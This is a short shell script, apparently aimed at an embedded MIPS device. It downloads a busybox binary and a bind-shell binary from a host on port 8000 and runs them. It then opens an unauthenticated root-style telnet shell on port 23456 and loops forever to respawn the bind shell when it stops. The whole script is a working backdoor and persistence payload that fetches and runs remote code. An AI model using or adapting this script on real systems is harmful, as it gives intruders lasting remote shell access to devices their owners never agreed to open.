#!/bin/sh

#download binaries
curl -o /tmp/busybox http://192.168.10.100:8000/busybox-mipsel ; chmod +x /tmp/busybox; 
curl -o /tmp/a http://192.168.10.100:8000/bind_shell ; chmod +x /tmp/a; 

#kick off the bind shell
/tmp/a &

#symlink so we can later get its pid easier to check to duplicate instances
/tmp/busybox ln -s /tmp/busybox /tmp/telnetd
/tmp/busybox pidof telnetd
if [ $? -ne 0 ]; then
	/tmp/telnetd -l /bin/sh -b 0.0.0.0:23456 &
fi

#respawn the bind shell when it goes down
while [ 1 -lt 2 ]; do
/tmp/busybox pidof a
if [ $? -ne 0 ]; then
	/tmp/a &
else
	/tmp/busybox sleep 10
fi
done;
